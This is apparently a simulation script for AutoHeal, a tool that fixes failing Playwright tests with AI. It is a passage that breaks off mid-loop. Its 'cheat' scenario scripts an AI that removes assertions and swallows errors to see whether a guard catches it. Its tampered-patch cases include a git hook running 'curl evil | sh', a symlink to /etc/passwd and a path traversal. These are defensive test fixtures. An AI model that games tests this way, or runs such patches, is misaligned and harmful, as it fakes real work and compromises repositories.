#!/usr/bin/env node
/**
 * End-to-end simulation with dummy data. For each scenario it copies the
 * dummy shop (simulation/fixture) into simulation/work/<name>, makes it a git
 * repo, runs the Playwright suite to produce a real failed run, moves the
 * report and traces into autoheal-artifacts/ (as the GitHub workflow does),
 * runs `autoheal heal` and checks every outcome.
 *
 * Scenarios
 *   rules   no AI key: flaky → QUARANTINED, price change → APP_BUG,
 *           locator drift → UNFIXED (needs AI), nothing hidden
 *   ai      scripted AI: fixes the login test and the page object; proves
 *           both with the stability rerun; PR body, memory, final guard
 *   cheat   scripted AI that tries to delete an assertion and swallow errors
 *           → BLOCKED_CHEATING, files unchanged, exit code 3; then gives up
 *           on the profile test → APP_BUG
 *   comment comment mode: proposes fixes but leaves the tree clean
 *   action  runs the heal action, then the publish action in a fresh clone (fix PR,
 *           issues), checks re-runs, comment mode and refuses tampered patches
 *   dashboard  uploads the "ai" results to a local dashboard and reads them back
 *   fingerprint  fingerprints saved from a green run of the old app; no AI key:
 *           the renamed button is found again (fixed without tokens), a
 *           second test with the same broken locator gets the same fix, and
 *           the profile assertion is not steered by the text it checks; the
 *           fixes and the app bug are linked to the commits that caused them
 *   reviews  an earlier AutoHeal PR with the same fix was closed: not proposed again
 *   metrics `autoheal metrics` against a stub GitHub API and a quarantine file
 *   policy  .autoheal.yml protects the page objects, skips the flaky test and
 *           lowers max-failures: the AI fixes only the login test; a broken
 *           policy file stops the job
 *
 * Usage: npm run simulate [-- <scenario> ...]
 */

import { execFileSync, spawn, spawnSync } from 'node:child_process';
import { cpSync, existsSync, mkdirSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { fakeGh, runAction } from './action-harness.mjs';

const here = path.dirname(fileURLToPath(import.meta.url));
const repo = path.dirname(here);
const fixture = path.join(here, 'fixture');
const workRoot = path.join(here, 'work');
const cli = path.join(repo, 'dist', 'cli.js');

if (!existsSync(path.join(fixture, 'node_modules', '@playwright', 'test'))) {
  console.log('Installing the fixture’s Playwright…');
  execFileSync('npm', ['install', '--no-audit', '--no-fund'], { cwd: fixture, stdio: 'inherit' });
}

let failures = 0;
const check = (cond, label) => {
  console.log(`  ${cond ? '✔' : '✘'} ${label}`);
  if (!cond) failures++;
};

function prepare(name, setup, afterCommit) {
  const dir = path.join(workRoot, name);
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(dir, { recursive: true });
  cpSync(fixture, dir, { recursive: true, filter: (src) => !src.includes(`${path.sep}node_modules`) });
  symlinkSync(path.join(fixture, 'node_modules'), path.join(dir, 'node_modules'), 'dir');
  setup?.(dir);
  const git = (...args) => execFileSync('git', args, { cwd: dir, stdio: 'pipe' });
  git('init', '-q');
  git('add', '-A');
  git('-c', 'user.email=sim@example.com', '-c', 'user.name=sim', 'commit', '-qm', 'dummy shop');
  afterCommit?.(dir, (msg) => {
    git('add', '-A');
    git('-c', 'user.email=dev@example.com', '-c', 'user.name=Dev', 'commit', '-qm', msg);
  });
  writeFileSync(path.join(dir, '.git', 'info', 'exclude'), 'autoheal-artifacts/\n.autoheal-out/\nscript.json\n');
  // The "CI run" that failed.
  spawnSync('npx', ['playwright', 'test'], { cwd: dir, stdio: 'pipe', env: { ...process.env, CI: '1' } });
  mkdirSync(path.join(dir, 'autoheal-artifacts'));
  for (const d of ['playwright-report', 'test-results']) cpSync(path.join(dir, d), path.join(dir, 'autoheal-artifacts', d), { recursive: true });
  rmSync(path.join(dir, 'playwright-report'), { recursive: true, force: true });
  rmSync(path.join(dir, 'test-results'), { recursive: true, force: true });
  rmSync(path.join(dir, '.flaky-marker'), { force: true }); // a fresh checkout, as on the heal runner
  return dir;
}

function heal(dir, args, env = {}) {
  const res = spawnSync(process.execPath, [cli, 'heal', '--report', 'autoheal-artifacts', '--max-failures', '4', ...args], {
    cwd: dir,
    encoding: 'utf8',
    env: { ...process.env, AUTOHEAL_PROVIDER: 'none', ANTHROPIC_API_KEY: '', OPENAI_API_KEY: '', ...env },
  });
  const summary = existsSync(path.join(dir, '.autoheal-out', 'summary.json')) ? JSON.parse(readFileSync(path.join(dir, '.autoheal-out', 'summary.json'), 'utf8')) : null;
  if (process.env.SIM_VERBOSE) console.log(res.stderr, res.stdout);
  return { code: res.status, stdout: res.stdout, stderr: res.stderr, summary };
}

const byTest = (summary, needle) => summary?.results.find((r) => r.failure.title.includes(needle));
const status = (dir) => execFileSync('git', ['status', '--porcelain'], { cwd: dir, encoding: 'utf8' }).trim();
const file = (dir, rel) => readFileSync(path.join(dir, rel), 'utf8');

function fixScript(login, po) {
  return [
    { text: 'Reading the test.', calls: [{ name: 'read_file', input: { path: 'tests/login.spec.ts' } }] },
    {
      calls: [
        {
          name: 'propose_fix',
          input: {
            path: 'tests/login.spec.ts',
            content: login.replace("name: 'Log in'", "name: 'Sign in'"),
            explanation: 'The submit button was renamed from "Log in" to "Sign in"; the trace shows only "Sign in".',
          },
        },
      ],
    },
    { calls: [{ name: 'read_file', input: { path: 'pages/profile.ts' } }] },
    {
      calls: [
        {
          name: 'propose_fix',
          input: {
            path: 'pages/profile.ts',
            content: po.replace("page.locator('#greeting')", "page.locator('#welcome-message')"),
            explanation: 'The greeting element was renamed to #welcome-message.',
          },
        },
      ],
    },
  ];
}

/** The dummy shop with fingerprints from a green run of the old app, then two app commits that break tests. */
function fingerprintRepo(name) {
  return prepare(
    name,
    (d) => {
      // A second test that clicks the same button: one UI change, two broken tests.
      writeFileSync(path.join(d, 'tests', 'checkout-login.spec.ts'), file(d, 'tests/login.spec.ts').replace("'user can log in'", "'checkout asks to log in'"));
      // A green run of the app as it was ("Log in"), traced, then `autoheal fingerprint`.
      const old = file(d, 'app/server.mjs').replace('>Sign in</button>', '>Log in</button>').replace('id="welcome-message"', 'id="greeting"');
      writeFileSync(path.join(d, 'app/server.mjs'), old);
      const green = spawnSync('npx', ['playwright', 'test', 'tests/login.spec.ts', 'tests/profile.spec.ts', '--trace', 'on'], { cwd: d, encoding: 'utf8', env: { ...process.env, CI: '1' } });
      check(green.status === 0, `green run of the old app passed (${green.status})`);
      const fp = spawnSync(process.execPath, [cli, 'fingerprint', '--traces', 'test-results'], { cwd: d, encoding: 'utf8' });
      check(fp.status === 0 && /saved [1-9]\d* element fingerprint/.test(fp.stderr), `fingerprints saved from the green run (${fp.stderr.trim()})`);
      // The base commit is the old app; the changes below come as their own commits.
      writeFileSync(path.join(d, 'app/server.mjs'), old.replace('$12', '$10'));
      for (const x of ['test-results', 'playwright-report']) rmSync(path.join(d, x), { recursive: true, force: true });
    },
    (d, commit) => {
      writeFileSync(path.join(d, 'app/server.mjs'), file(d, 'app/server.mjs').replace('>Log in</button>', '>Sign in</button>').replace('id="greeting"', 'id="welcome-message"'));
      commit('Rename the login button to Sign in');
      writeFileSync(path.join(d, 'app/server.mjs'), file(d, 'app/server.mjs').replace('$10', '$12'));
      commit('Raise the Pro price');
    },
  );
}

const scenarios = {
  rules() {
    const dir = prepare('rules');
    const { code, summary } = heal(dir, ['--mode', 'draft-pr']);
    check(code === 0, `exit code 0 (got ${code})`);
    check(summary?.totalFailures === 4, `4 failures read from the report (got ${summary?.totalFailures})`);
    check(byTest(summary, 'status badge')?.status === 'QUARANTINED', 'flaky test → QUARANTINED');
    check(byTest(summary, 'pro plan price')?.status === 'APP_BUG', 'price change → APP_BUG (test not touched)');
    check(byTest(summary, 'pro plan price')?.rootCause === 'REGRESSION', 'price change root cause REGRESSION');
    check(byTest(summary, 'user can log in')?.category === 'TEST_BUG', 'login → TEST_BUG');
    check(byTest(summary, 'user can log in')?.status === 'UNFIXED', 'login → UNFIXED without an AI key');
    check(byTest(summary, 'profile greets')?.rootCause === 'LOCATOR_DRIFT', 'profile → LOCATOR_DRIFT');
    check(file(dir, 'tests/pricing.spec.ts').includes("toHaveText('$10')"), 'pricing test unchanged');
    check(existsSync(path.join(dir, 'playwright-quarantine.json')), 'quarantine file written');
    const q = existsSync(path.join(dir, 'playwright-quarantine.json')) ? file(dir, 'playwright-quarantine.json') : '';
    check(/status badge/.test(q) && /expires|until|days/i.test(q), 'quarantine entry has the test and an expiry');
    check(summary?.changes === true && summary.changedFiles.includes('playwright-quarantine.json'), 'changes = quarantine file only');
    check(existsSync(path.join(dir, '.autoheal-out', 'issue-1.md')), 'issue body written for the app bug');
    check(summary?.spend.inputTokens === 0, 'no AI tokens used');
  },

  ai() {
    const dir = prepare('ai');
    const login = file(dir, 'tests/login.spec.ts');
    const po = file(dir, 'pages/profile.ts');
    const script = fixScript(login, po);
    writeFileSync(path.join(dir, 'script.json'), JSON.stringify(script));
    const requestLog = path.join(workRoot, 'ai-requests.log');
    writeFileSync(requestLog, '');
    const { code, summary } = heal(dir, ['--mode', 'draft-pr'], { AUTOHEAL_PROVIDER: 'scripted', AUTOHEAL_SCRIPT: path.join(dir, 'script.json'), AUTOHEAL_SCRIPT_LOG: requestLog, AUTOHEAL_PRICE_IN: '4', AUTOHEAL_PRICE_OUT: '20' });
    check(code === 0, `exit code 0 (got ${code})`);
    const l = byTest(summary, 'user can log in');
    const p = byTest(summary, 'profile greets');
    check(l?.status === 'FIXED' && l.fix?.by === 'ai', 'login → FIXED by the AI agent');
    check(l?.stability?.passed === true && l.stability.runs === 5, 'login fix passed 5 stability runs');
    check(l?.guard?.engine === 'PASS' && l.guard.local === 'PASS', 'login fix passed both anti-cheat scans');
    check(p?.status === 'FIXED' && p.fix?.file === 'pages/profile.ts', 'profile → FIXED in the page object');
    check(byTest(summary, 'pro plan price')?.status === 'APP_BUG', 'price change still APP_BUG');
    check(file(dir, 'tests/login.spec.ts').includes("name: 'Sign in'"), 'login file has the fix');
    check(file(dir, 'pages/profile.ts').includes('#welcome-message'), 'page object has the fix');
    const memFiles = existsSync(path.join(dir, '.autoheal', 'memory')) ? readdirSync(path.join(dir, '.autoheal', 'memory')) : [];
    check(memFiles.length === 2, `repo memory: one file per fix (got ${memFiles.length})`);
    const body = existsSync(path.join(dir, '.autoheal-out', 'pr-body.md')) ? file(dir, '.autoheal-out/pr-body.md') : '';
    check(/Stability proof/.test(body) && /Anti-cheat/.test(body) && /Sign in/.test(body), 'PR body has stability, anti-cheat and the diff');
    check(/<!-- autoheal-run:[A-Za-z0-9+/=]+ -->/.test(body), 'PR body carries the run totals for metrics');
    check(summary?.spend.inputTokens > 0 && summary.spend.usd > 0, `spend recorded ($${summary?.spend.usd})`);
    // Visual grounding: the agent's first request carried the trace's failure frame.
    const requests = readFileSync(requestLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
    const firstFix = requests.find((r) => r.tools > 0);
    check(firstFix?.images?.length === 1 && /image\/(png|jpeg)/.test(firstFix.images[0].mediaType) && firstFix.images[0].bytes > 1000, `the AI got the failure screenshot (${JSON.stringify(firstFix?.images)})`);
    check(Boolean(l?.failure?.screenshot) && /Visual grounding/.test(body), `PR body says the AI saw the page at the moment of failure (${l?.failure?.screenshot})`);
    // Guard v2: a traced rerun was compared with the failed run, and the screenshots were saved.
    check(/Runtime guard \| traced rerun: \d+ assertion/.test(body) && l?.runtime?.checked === true, `the runtime guard compared the failed and fixed runs (${JSON.stringify(l?.runtime)})`);
    const ev = l?.runtime?.evidence ?? {};
    check(Boolean(ev.before && ev.after) && [ev.before, ev.after].every((f) => readFileSync(path.join(dir, '.autoheal-out', 'evidence', f)).length > 1000), `before/after screenshots saved for the PR (${JSON.stringify(ev)})`);
    const out = readFileSync(path.join(dir, '.autoheal-out', 'summary.json'), 'utf8') + body;
    check(!/[A-Za-z0-9+/]{2000}/.test(out), 'no image data in summary.json or the PR body');
    check(
      ['pages/profile.ts', 'playwright-quarantine.json', 'tests/login.spec.ts'].every((f) => summary?.changedFiles.includes(f)) &&
        summary.changedFiles.filter((f) => f.startsWith('.autoheal/memory/')).length === 2,
      `changed files listed (${summary?.changedFiles.join(', ')})`,
    );
    const rerun = spawnSync('npx', ['playwright', 'test', 'tests/login.spec.ts', 'tests/profile.spec.ts'], { cwd: dir, encoding: 'utf8' });
    check(rerun.status === 0, 'fixed tests pass in a fresh Playwright run');
    return { dir, summary };
  },

  cheat() {
    const dir = prepare('cheat');
    const login = file(dir, 'tests/login.spec.ts');
    const script = [
      {
        calls: [
          {
            name: 'propose_fix',
            input: {
              path: 'tests/login.spec.ts',
              content: login
                .replace("  await page.getByRole('button', { name: 'Log in' }).click();\n", '')
                .replace("  await expect(page.getByRole('status')).toHaveText('Signed in as ada@example.com');\n", ''),
              explanation: 'Remove the flaky steps.',
            },
          },
        ],
      },
      {
        calls: [
          {
            name: 'propose_fix',
            input: {
              path: 'tests/login.spec.ts',
              content: login.replace(
                "  await page.getByRole('button', { name: 'Log in' }).click();",
                "  try { await page.getByRole('button', { name: 'Log in' }).click({ timeout: 1000 }); } catch {}",
              ),
              explanation: 'Ignore the click error.',
            },
          },
        ],
      },
      { calls: [{ name: 'give_up', input: { reason: 'The page shows no greeting element at all; this looks like an app change.' } }] },
    ];
    writeFileSync(path.join(dir, 'script.json'), JSON.stringify(script));
    const before = file(dir, 'tests/login.spec.ts');
    const { code, summary } = heal(dir, ['--mode', 'draft-pr'], { AUTOHEAL_PROVIDER: 'scripted', AUTOHEAL_SCRIPT: path.join(dir, 'script.json') });
    check(code === 3, `exit code 3 for a blocked fix (got ${code})`);
    check(summary?.outcome === 'blocked', 'outcome blocked');
    const l = byTest(summary, 'user can log in');
    check(l?.status === 'BLOCKED_CHEATING', 'login → BLOCKED_CHEATING');
    check(l?.guard?.findings.some((f) => f.rule === 'assertion-removed' || f.rule === 'swallowed-error'), 'findings name the cheat');
    check(file(dir, 'tests/login.spec.ts') === before, 'login file unchanged on disk');
    check(byTest(summary, 'profile greets')?.status === 'APP_BUG', 'agent gave up on profile → APP_BUG');
  },

  comment() {
    const dir = prepare('comment');
    const login = file(dir, 'tests/login.spec.ts');
    writeFileSync(
      path.join(dir, 'script.json'),
      JSON.stringify([{ calls: [{ name: 'propose_fix', input: { path: 'tests/login.spec.ts', content: login.replace("name: 'Log in'", "name: 'Sign in'"), explanation: 'Button renamed.' } }] }, { calls: [{ name: 'give_up', input: { reason: 'skip' } }] }]),
    );
    const { code, summary } = heal(dir, ['--mode', 'comment', '--no-flaky-check'], { AUTOHEAL_PROVIDER: 'scripted', AUTOHEAL_SCRIPT: path.join(dir, 'script.json') });
    check(code === 0, `exit code 0 (got ${code})`);
    check(byTest(summary, 'user can log in')?.status === 'FIXED', 'fix proposed');
    check(summary?.changes === false, 'changes = false in comment mode');
    check(status(dir) === '', `working tree clean (got "${status(dir)}")`);
    check(existsSync(path.join(dir, '.autoheal-out', 'comment.md')) && file(dir, '.autoheal-out/comment.md').includes('Sign in'), 'comment has the proposed diff');
  },

  fingerprint() {
    const dir = fingerprintRepo('fingerprint');
    const saved = readdirSync(path.join(dir, '.autoheal', 'fingerprints'));
    check(saved.length >= 3, `fingerprints committed with the repo (${saved.length})`);
    const { code, summary } = heal(dir, ['--mode', 'draft-pr', '--max-failures', '2']);
    check(code === 0, `exit code 0 (got ${code})`);
    check(summary?.totalFailures === 5, `5 failures read (got ${summary?.totalFailures})`);
    const first = byTest(summary, 'checkout asks to log in');
    const second = byTest(summary, 'user can log in');
    check(first?.status === 'FIXED' && first.fix?.by === 'fingerprint', `renamed button fixed from its fingerprint (${first?.status} by ${first?.fix?.by}: ${first?.summary})`);
    check(first?.fix?.locators?.[0]?.to === 'strong' && first?.fix?.match?.score > 0, `strong locator, with the match score (${JSON.stringify(first?.fix?.locators)} ${JSON.stringify(first?.fix?.match)})`);
    check(first?.stability?.passed === true && first?.runtime?.checked === true, 'fingerprint fix passed the stability rerun and the runtime guard');
    check(second?.status === 'FIXED' && second.fix?.by === 'same-change' && second.fix.sameAs?.endsWith('checkout asks to log in'), `past max-failures, the same UI change got the same fix (${second?.status} by ${second?.fix?.by})`);
    check(file(dir, 'tests/login.spec.ts').includes("name: 'Sign in'") && file(dir, 'tests/checkout-login.spec.ts').includes("name: 'Sign in'"), 'both specs now find the button by its new name');
    const profile = byTest(summary, 'profile greets');
    check(!profile || profile.fix?.by !== 'fingerprint', 'the profile assertion was not fixed from the text it checks');
    check(file(dir, 'pages/profile.ts').includes("'#greeting'"), 'page object unchanged without AI');
    check(summary?.spend.inputTokens === 0, 'no AI tokens used');
    const body = file(dir, '.autoheal-out/pr-body.md');
    check(/One UI change, one fix/.test(body) && /fixed 2 tests/.test(body), 'PR body groups the two tests under one UI change');
    check(/element fingerprint, no AI tokens/.test(body) && /Locator: .*strong/.test(body), 'PR body names the fingerprint fix and the locator strength');
    const rerun = spawnSync('npx', ['playwright', 'test', 'tests/login.spec.ts', 'tests/checkout-login.spec.ts'], { cwd: dir, encoding: 'utf8' });
    check(rerun.status === 0, 'both fixed tests pass in a fresh Playwright run');
    // Find the cause: the app commits behind the fixes and the app bug.
    check(first?.cause?.subject === 'Rename the login button to Sign in' && /Log in.*Sign in/.test(first.cause.evidence), `fix linked to the commit that renamed the button (${JSON.stringify(first?.cause)})`);
    check(second?.cause?.commit === first?.cause?.commit, 'the same-change fix has the same cause');
    check(/Likely cause/.test(body) && /Rename the login button to Sign in/.test(body), 'PR body names the commit');
  },

  reviews() {
    // An earlier AutoHeal PR made the same fingerprint fix, and a reviewer closed it.
    const dir = fingerprintRepo('reviews');
    const marker = Buffer.from(JSON.stringify([{ file: 'tests/checkout-login.spec.ts', test: 'checkout-login.spec.ts › checkout asks to log in', by: 'fingerprint', before: "getByRole('button', { name: 'Log in' })", after: "getByRole('button', { name: 'Sign in' })" }])).toString('base64');
    const pulls = [{ number: 5, body: `<!-- autoheal-fixes:${marker} -->\nAutoHeal`, merged_at: null, closed_at: '2026-11-01T00:00:00Z', head: { ref: 'autoheal/77', repo: { full_name: 'acme/shop' } }, base: { repo: { full_name: 'acme/shop' } } }];
    // A stub GitHub API on a free port (the port is written to a file once it listens).
    const portFile = path.join(dir, '.git', 'stub-port');
    const stub = spawn(
      process.execPath,
      // Fixed code; the data and the port file come in through the environment.
      ['-e', "const s = require('http').createServer((q, r) => { r.setHeader('content-type', 'application/json'); r.end(q.url.startsWith('/repos/acme/shop/pulls?') ? process.env.STUB_PULLS : '[]'); }).listen(0, '127.0.0.1', () => require('fs').writeFileSync(process.env.STUB_PORT_FILE, String(s.address().port)))"],
      { stdio: 'ignore', env: { ...process.env, STUB_PULLS: JSON.stringify(pulls), STUB_PORT_FILE: portFile } },
    );
    for (let i = 0; i < 50 && !existsSync(portFile); i++) Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 100);
    const port = readFileSync(portFile, 'utf8').trim();
    try {
      const { code, summary } = heal(dir, ['--mode', 'draft-pr', '--max-failures', '5', '--no-flaky-check'], { GITHUB_REPOSITORY: 'acme/shop', GITHUB_TOKEN: 'fake', GITHUB_API_URL: `http://127.0.0.1:${port}` });
      check(code === 0, `exit code 0 (got ${code})`);
      check(summary?.reviews?.closed === 1 && !summary.reviews.note, `read 1 closed AutoHeal PR (${JSON.stringify(summary?.reviews)})`);
      const r = byTest(summary, 'checkout asks to log in');
      check(r?.fix?.by !== 'fingerprint' && r?.reasons.some((x) => /closed without merging in PR #5/.test(x)), `the change reviewers closed was not proposed again (${r?.status}: ${r?.reasons?.join('; ')})`);
      check(file(dir, 'tests/checkout-login.spec.ts').includes("name: 'Log in'"), 'test file unchanged');
      // Find the cause works for app bugs too: the commit that changed the value.
      const price = byTest(summary, 'pro plan price');
      check(price?.status === 'APP_BUG' && price.cause?.subject === 'Raise the Pro price', `app bug linked to the commit that changed the price (${JSON.stringify(price?.cause)})`);
      const issue = readdirSync(path.join(dir, '.autoheal-out')).filter((f) => /^issue-\d+\.md$/.test(f)).map((f) => file(dir, `.autoheal-out/${f}`)).join('\n');
      check(/Likely cause/.test(issue) && /Raise the Pro price/.test(issue), 'the app-bug issue names the commit');
    } finally {
      stub.kill();
    }
  },

  action() {
    const dir = prepare('action');
    execFileSync('git', ['branch', '-M', 'main'], { cwd: dir });
    const remote = path.join(workRoot, 'action-remote.git');
    rmSync(remote, { recursive: true, force: true });
    execFileSync('git', ['init', '-q', '--bare', remote]);
    execFileSync('git', ['remote', 'add', 'origin', remote], { cwd: dir });
    execFileSync('git', ['push', '-q', 'origin', 'main'], { cwd: dir, stdio: 'pipe' });
    const bin = path.join(workRoot, 'action-bin');
    const ghLog = path.join(workRoot, 'action-gh.log');
    rmSync(ghLog, { force: true });
    writeFileSync(ghLog, '');
    fakeGh(bin, ghLog);
    writeFileSync(path.join(dir, 'script.json'), JSON.stringify(fixScript(file(dir, 'tests/login.spec.ts'), file(dir, 'pages/profile.ts'))));
    writeFileSync(path.join(dir, '.git', 'info', 'exclude'), 'autoheal-artifacts/\n.autoheal-out/\nscript.json\n.runner-temp/\n');
    const github = {
      repository: 'acme/shop', run_id: '9', ref_name: 'main', sha: 'f'.repeat(40), actor: 'ada',
      event: { workflow_run: { id: 4242, html_url: 'https://github.com/acme/shop/actions/runs/4242', head_sha: 'a'.repeat(40), head_branch: 'main', actor: { login: 'ada' }, pull_requests: [] } },
    };
    const env = { PATH: `${bin}${path.delimiter}${process.env.PATH}`, AUTOHEAL_PROVIDER: 'scripted', AUTOHEAL_SCRIPT: path.join(dir, 'script.json'), ANTHROPIC_API_KEY: '', OPENAI_API_KEY: '' };
    const run = runAction({ actionDir: repo, projectDir: dir, inputs: { 'max-failures': '4' }, github, env, skip: ['Install AutoHeal AI'] });
    const steps = Object.fromEntries(run.log.map((s) => [s.step, s]));
    if (!run.ok || process.env.SIM_VERBOSE) for (const s of run.log) console.log(`    [${s.step}] ${s.skipped ? 'skipped' : `exit ${s.code}`}\n${s.stderr ?? ''}${s.stdout ?? ''}`);
    check(run.ok, 'heal job: every step succeeded');
    // 0.5.0 sandbox: tests and fixes ran as a separate user that cannot read the heal process's environment.
    const sb = run.ctx.steps.sandbox ?? {};
    check(sb.user === 'autoheal-sb', `sandbox user prepared (${JSON.stringify(sb)})`);
    const healSummary = JSON.parse(readFileSync(path.join(dir, '.runner-temp', 'autoheal-out', 'summary.json'), 'utf8'));
    check(/ran as the separate user `autoheal-sb`/.test(healSummary.sandbox ?? ''), `summary says the tests ran in the sandbox (${healSummary.sandbox})`);
    const owner = execFileSync('stat', ['-c', '%U', path.join(dir, 'test-results', '.last-run.json')], { encoding: 'utf8' }).trim();
    check(owner === 'autoheal-sb', `the reruns ran as the sandbox user (test-results written by ${owner})`);
    const gitWrite = spawnSync('sudo', ['-n', '-u', 'autoheal-sb', '--', 'sh', '-c', `echo x >> "$1"`, 'sh', path.join(dir, '.git', 'config')], { encoding: 'utf8' });
    check(gitWrite.status !== 0, 'the sandbox user cannot change .git/config');
    const holder = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 20000)'], { env: { ...process.env, ANTHROPIC_API_KEY: 'sk-ant-sim-not-a-real-key' }, stdio: 'ignore' });
    const peek = spawnSync('sudo', ['-n', '-u', 'autoheal-sb', '--', 'cat', `/proc/${holder.pid}/environ`], { encoding: 'utf8' });
    holder.kill();
    check(peek.status !== 0 && !peek.stdout.includes('sk-ant-sim'), `the sandbox user cannot read the key from the heal process (${peek.stderr.trim()})`);
    check(run.ctx.steps.heal?.outcome === 'fixed' && run.ctx.steps.heal?.fixed === '2', `heal outputs: outcome=${run.ctx.steps.heal?.outcome} fixed=${run.ctx.steps.heal?.fixed}`);
    check(readFileSync(ghLog, 'utf8') === '', 'heal job made no GitHub calls (read-only)');
    const result = run.ctx.steps.package?.['result-dir'];
    check(result && existsSync(path.join(result, 'patch.diff')) && existsSync(path.join(result, 'meta.json')), 'heal job packed a patch for the publish job');
    check(steps['Upload the result for the publish job']?.uses?.startsWith('actions/upload-artifact@'), 'result handed over as an artifact');
    const changedList = readFileSync(path.join(result, 'changed-files.txt'), 'utf8').trim().split('\n');
    check(changedList.includes('tests/login.spec.ts') && changedList.includes('pages/profile.ts'), `changed files listed (${changedList.length})`);

    // The publish job: a fresh checkout of the failed commit, no npm install.
    const publishDir = path.join(workRoot, 'action-publish');
    const freshClone = () => {
      rmSync(publishDir, { recursive: true, force: true });
      execFileSync('git', ['clone', '-q', '-b', 'main', remote, publishDir], { stdio: 'pipe' });
      writeFileSync(path.join(publishDir, '.git', 'info', 'exclude'), '.runner-temp/\n');
    };
    const publish = (inputs, resultDir = result) => {
      freshClone();
      return runAction({ actionDir: path.join(repo, 'publish'), projectDir: publishDir, inputs: { 'result-dir': resultDir, 'allowed-paths': 'tests/**, pages/**', 'base-branch': 'main', 'run-id': '4242', commit: 'a'.repeat(40), blocked: run.ctx.steps.heal.blocked, ...inputs }, github, env });
    };
    const pub = publish({});
    if (!pub.ok || process.env.SIM_VERBOSE) for (const s of pub.log) console.log(`    [publish ${s.step}] exit ${s.code}\n${s.stderr ?? ''}${s.stdout ?? ''}`);
    check(pub.ok, 'publish job succeeded');
    check(pub.ctx.steps.publish?.['pr-url'] === 'https://github.com/acme/shop/pull/101', 'fix PR opened');
    const calls = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
    const create = calls.find((c) => c[0] === 'pr' && c[1] === 'create');
    check(create?.includes('--draft') && create[create.indexOf('--base') + 1] === 'main' && create[create.indexOf('--head') + 1] === 'autoheal/4242', 'draft PR from autoheal/4242 into main');
    const issue = calls.find((c) => c[0] === 'issue' && c[1] === 'create');
    check(issue && /AutoHeal/.test(issue[issue.indexOf('--title') + 1]) && /price/i.test(issue[issue.indexOf('--title') + 1]), `app bug issue opened (${issue?.[issue.indexOf('--title') + 1]})`);
    const pushed = execFileSync('git', ['--git-dir', remote, 'show', '--name-only', '--format=%s', 'autoheal/4242'], { encoding: 'utf8' });
    check(/AutoHeal fixes for failed run 4242/.test(pushed), 'fix commit pushed to the bot branch');
    const pushedFiles = pushed.trim().split('\n').slice(1).filter(Boolean).sort();
    const pushedCode = pushedFiles.filter((f) => !f.startsWith('.autoheal/memory/') && !f.startsWith('.autoheal/fingerprints/'));
    const pushedPrints = pushedFiles.filter((f) => f.startsWith('.autoheal/fingerprints/'));
    check(
      JSON.stringify(pushedCode) === JSON.stringify(['pages/profile.ts', 'playwright-quarantine.json', 'tests/login.spec.ts']) && pushedFiles.length === 5 + pushedPrints.length && pushedPrints.length > 0,
      `only healed files, their 2 memory entries and ${pushedPrints.length} element fingerprints committed (${pushedFiles.join(', ')})`,
    );
    const healedSpec = execFileSync('git', ['--git-dir', remote, 'show', 'autoheal/4242:tests/login.spec.ts'], { encoding: 'utf8' });
    check(healedSpec === file(dir, 'tests/login.spec.ts'), 'pushed spec matches what the heal job verified');
    const mainHead = execFileSync('git', ['--git-dir', remote, 'log', '-1', '--format=%s', 'main'], { encoding: 'utf8' }).trim();
    check(mainHead === 'dummy shop', 'base branch untouched');

    // Same run published again (a re-run): the PR is updated, not duplicated.
    const again = publish({});
    const calls2 = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
    check(again.ok && calls2.filter((c) => c[0] === 'pr' && c[1] === 'create').length === 1 && calls2.some((c) => c[0] === 'pr' && c[1] === 'edit'), 're-run updates the existing PR');

    // A base that is itself an AutoHeal branch is refused (loop guard).
    const loop = publish({ 'base-branch': 'autoheal/1' });
    check(loop.ok && /Refusing/.test(loop.log[0]?.stdout ?? ''), 'PR against an autoheal/ branch refused');

    // Comment mode pushes nothing and comments on the commit.
    const before = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).length;
    const comment = publish({ mode: 'comment' });
    const calls3 = readFileSync(ghLog, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)).slice(before);
    check(comment.ok && calls3.length === 1 && calls3[0][0] === 'api' && /commits\/a{40}\/comments/.test(calls3[0][1]), 'comment mode only posts a comment');

    // A tampered result is refused before anything is applied or pushed.
    const evil = (name, patch) => {
      const d = path.join(workRoot, `action-evil-${name}`);
      rmSync(d, { recursive: true, force: true });
      cpSync(result, d, { recursive: true });
      writeFileSync(path.join(d, 'patch.diff'), patch);
      writeFileSync(path.join(d, 'changed-files.txt'), '');
      rmSync(path.join(d, 'changed-files.txt'));
      const branchesBefore = execFileSync('git', ['--git-dir', remote, 'branch', '--list', 'autoheal/666'], { encoding: 'utf8' });
      const res = publish({ 'run-id': '666' }, d);
      const branchesAfter = execFileSync('git', ['--git-dir', remote, 'branch', '--list', 'autoheal/666'], { encoding: 'utf8' });
      return { ok: res.ok, out: res.log[0]?.stdout ?? '', pushed: branchesAfter !== branchesBefore };
    };
    const newFile = (p, body) => `diff --git a/${p} b/${p}\nnew file mode 100644\nindex 0000000..1111111\n--- /dev/null\n+++ b/${p}\n@@ -0,0 +1 @@\n+${body}\n`;
    const cases = {
      workflow: newFile('.github/workflows/pwn.yml', 'on: push'),
      hook: newFile('.git/hooks/pre-commit', 'curl evil | sh'),
      traversal: newFile('tests/../../etc/x.ts', 'x'),
      newcode: newFile('tests/evil.spec.ts', 'require("child_process")'),
      config: `diff --git a/playwright.config.ts b/playwright.config.ts\nindex 1111111..2222222 100644\n--- a/playwright.config.ts\n+++ b/playwright.config.ts\n@@ -1 +1 @@\n-x\n+y\n`,
      symlink: `diff --git a/tests/link.ts b/tests/link.ts\nnew file mode 120000\nindex 0000000..1111111\n--- /dev/null\n+++ b/tests/link.ts\n@@ -0,0 +1 @@\n+/etc/passwd\n\\ No newline at end of file\n`,
      rename: `diff --git a/tests/login.spec.ts b/tests/x.spec.ts\nsimilarity index 100%\nrename from tests/login.spec.ts\nrename to tests/x.spec.ts\n`,
      mode: `diff --git a/tests/login.spec.ts b/tests/login.spec.ts\nold mode 100644\nnew mode 100755\n`,
    };
    for (const [name, patch] of Object.entries(cases)) {
